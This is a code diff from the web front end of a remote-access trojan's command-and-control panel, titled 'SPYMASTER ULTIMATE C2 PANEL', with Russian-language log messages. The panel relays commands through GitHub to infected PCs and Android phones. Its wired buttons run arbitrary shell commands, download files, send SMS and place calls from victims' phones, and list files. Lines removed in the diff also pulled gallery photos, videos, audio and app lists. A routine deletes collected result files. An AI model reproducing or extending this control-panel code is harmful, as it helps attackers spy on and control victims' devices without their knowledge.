-                    const protectedFiles = ["index.html", "style.css", "script.js", "config.js", ".gitignore", ".nojekyll"];
+                    const protectedFiles = ["index.html", "style.css", "script.js", "config.js", ".gitignore"];
                     let deleted = 0;
                     for (const file of files) {
                         if (protectedFiles.includes(file.name)) continue;
@@ -1523,19 +1421,12 @@
                     }
                     addLog(`💣 УДАЛЕНО: ${deleted} файлов`, "success", false);
                     addLog(`💣 УДАЛЕНО: ${deleted} файлов`, "success", true);
-                    pcSeenFiles = [];
-                    androidSeenFiles = [];
-                    pcClients = [];
-                    androidDevices = [];
-                    loadResults(false);
-                    loadResults(true);
+                    pcSeenFiles = []; androidSeenFiles = []; pcClients = []; androidDevices = [];
+                    loadResults(false); loadResults(true);
                 }
-            } catch (error) {
-                addLog(`❌ Ошибка: ${error.message}`, "error", false);
-            }
+            } catch (error) { addLog(`❌ Ошибка: ${error.message}`, "error", false); }
         }
 
-        // ============= ИНИЦИАЛИЗАЦИЯ =============
         function init() {
             addLog("🐀 SPYMASTER ULTIMATE C2 PANEL v4.0 ЗАПУЩЕН", "system", false);
             addLog("🐀 АВТОР: КРЫСА ГУБЕРНАТОРСКАЯ", "system", false);
@@ -1546,123 +1437,68 @@
             loadResults(false);
             loadResults(true);
             
-            // ============= PC КНОПКИ =============
             document.querySelectorAll('#pcMode .cmd-btn, #pcMode .cmd-small').forEach(btn => {
                 if (btn.id !== 'sendCustomBtn' && btn.id !== 'downloadBtn' && btn.id !== 'shellBtn' && btn.id !== 'clearCommandsBtn' && btn.id !== 'clearAllBtn' && btn.id !== 'refreshBtn') {
-                    btn.onclick = () => {
-                        const cmd = btn.getAttribute('data-cmd');
-                        if (cmd) sendCommandToGithub(cmd, false);
-                    };
+                    btn.onclick = () => { const cmd = btn.getAttribute('data-cmd'); if (cmd) sendCommandToGithub(cmd, false); };
                 }
             });
             
             document.getElementById("sendCustomBtn")?.addEventListener("click", () => {
                 const input = document.getElementById("customCmd");
-                if (input && input.value) {
-                    sendCommandToGithub(input.value, false);
-                    input.value = '';
-                }
+                if (input && input.value) { sendCommandToGithub(input.value, false); input.value = ''; }
             });
-            
             document.getElementById("downloadBtn")?.addEventListener("click", () => {
                 const input = document.getElementById("downloadPath");
-                if (input && input.value) {
-                    sendCommandToGithub(`/download ${input.value}`, false);
-                }
+                if (input && input.value) sendCommandToGithub(`/download ${input.value}`, false);
             });
-            
             document.getElementById("shellBtn")?.addEventListener("click", () => {
                 const input = document.getElementById("shellCmd");
-                if (input && input.value) {
-                    sendCommandToGithub(`/cmd ${input.value}`, false);
-                }
+                if (input && input.value) sendCommandToGithub(`/cmd ${input.value}`, false);
             });
-            
             document.getElementById("clearCommandsBtn")?.addEventListener("click", clearCommands);
             document.getElementById("refreshBtn")?.addEventListener("click", () => loadResults(false));
             document.getElementById("clearAllBtn")?.addEventListener("click", clearAllFiles);
-            
             document.getElementById("clientSelect")?.addEventListener("change", (e) => {
                 pcCurrentClient = e.target.value;
                 addLog(`🎯 ВЫБРАН PC КЛИЕНТ: ${pcCurrentClient === "all" ? "ВСЕ" : pcCurrentClient}`, "success", false);
             });
             
-            // ============= ANDROID КНОПКИ =============
             document.querySelectorAll('#androidMode .cmd-btn').forEach(btn => {
-                btn.onclick = () => {
-                    const cmd = btn.getAttribute('data-android-cmd');
-                    if (cmd) sendCommandToGithub(cmd, true);
-                };
+                btn.onclick = () => { const cmd = btn.getAttribute('data-android-cmd'); if (cmd) sendCommandToGithub(cmd, true); };
             });
-            
             document.getElementById("androidSendCustomBtn")?.addEventListener("click", () => {
                 const input = document.getElementById("androidCustomCmd");
-                if (input && input.value) {
-                    sendCommandToGithub(input.value, true);
-                    input.value = '';
-                }
+                if (input && input.value) { sendCommandToGithub(input.value, true); input.value = ''; }
             });
-            
             document.getElementById("androidSmsBtn")?.addEventListener("click", () => {
                 const number = document.getElementById("androidSmsNumber")?.value;
                 const text = document.getElementById("androidSmsText")?.value;
-                if (number && text) {
-                    sendCommandToGithub(`/sms:${number} ${text}`, true);
-                }
+                if (number && text) sendCommandToGithub(`/sms:${number} ${text}`, true);
             });
-            
             document.getElementById("androidCallBtn")?.addEventListener("click", () => {
                 const number = document.getElementById("androidCallNumber")?.value;
-                if (number) {
-                    sendCommandToGithub(`/call:${number}`, true);
-                }
+                if (number) sendCommandToGithub(`/call:${number}`, true);
             });
-            
             document.getElementById("androidFilesBtn")?.addEventListener("click", () => {
                 const path = document.getElementById("androidFilePath")?.value || "/sdcard";
                 sendCommandToGithub(`/files ${path}`, true);
             });
-            
             document.getElementById("androidDownloadBtn")?.addEventListener("click", () => {
                 const path = document.getElementById("androidDownloadPath")?.value;
-                if (path) {
-                    sendCommandToGithub(`/download ${path}`, true);
-                }
+                if (path) sendCommandToGithub(`/download ${path}`, true);
             });
-            
             document.getElementById("androidShellBtn")?.addEventListener("click", () => {
                 const cmd = document.getElementById("androidShellCmd")?.value;
-                if (cmd) {
-                    sendCommandToGithub(`/cmd ${cmd}`, true);
-                }
+                if (cmd) sendCommandToGithub(`/cmd ${cmd}`, true);
             });
-            
-            document.getElementById("androidGalleryImagesBtn")?.addEventListener("click", () => {
-                sendCommandToGithub("/gallery_images", true);
-            });
-            
-            document.getElementById("androidGalleryVideosBtn")?.addEventListener("click", () => {
-                sendCommandToGithub("/gallery_videos", true);
-            });
-            
-            document.getElementById("androidAudioBtn")?.addEventListener("click", () => {
-                sendCommandToGithub("/audio", true);
-            });
-            
-            document.getElementById("androidAppsBtn")?.addEventListener("click", () => {
-                sendCommandToGithub("/apps", true);
-            });
-            
             document.getElementById("androidClearCommandsBtn")?.addEventListener("click", clearCommands);
             document.getElementById("androidRefreshBtn")?.addEventListener("click", () => loadResults(true));
             document.getElementById("androidClearAllBtn")?.addEventListener("click", clearAllFiles);
-            
             document.getElementById("androidClientSelect")?.addEventListener("change", (e) => {
                 androidCurrentDevice = e.target.value;
                 addLog(`🎯 ВЫБРАНО ANDROID УСТРОЙСТВО: ${androidCurrentDevice === "all" ? "ВСЕ" : androidCurrentDevice}`, "success", true);
             });
             
-            // ============= ВКЛАДКИ PC =============
             document.querySelectorAll('#pcMode .tab-btn').forEach(btn => {
                 btn.onclick = () => {
                     document.querySelectorAll('#pcMode .tab-btn').forEach(b => b.classList.remove('active'));
@@ -1673,7 +1509,6 @@
                 };
             });
             
-            // ============= ВКЛАДКИ ANDROID =============
             document.querySelectorAll('#androidMode .tab-btn').forEach(btn => {
                 btn.onclick = () => {
                     document.querySelectorAll('#androidMode .tab-btn').forEach(b => b.classList.remove('active'));
@@ -1684,23 +1519,16 @@
                 };
             });
             
-            // ============= ПЕРЕКЛЮЧЕНИЕ РЕЖИМОВ =============
             document.querySelectorAll('.mode-btn').forEach(btn => {
-                btn.onclick = () => {
-                    switchMode(btn.getAttribute('data-mode'));
-                };
+                btn.onclick = () => switchMode(btn.getAttribute('data-mode'));
             });
             
             addLog("✅ ИНТЕРФЕЙС ЗАГРУЖЕН", "success", false);
             addLog("✅ ANDROID ИНТЕРФЕЙС ГОТОВ", "success", true);
         }
 
-        // Запуск
-        if (document.readyState === "loading") {
-            document.addEventListener("DOMContentLoaded", init);
-        } else {
-            init();
-        }
+        if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", init);
+        else init();
     </script>
 </body>
 </html>
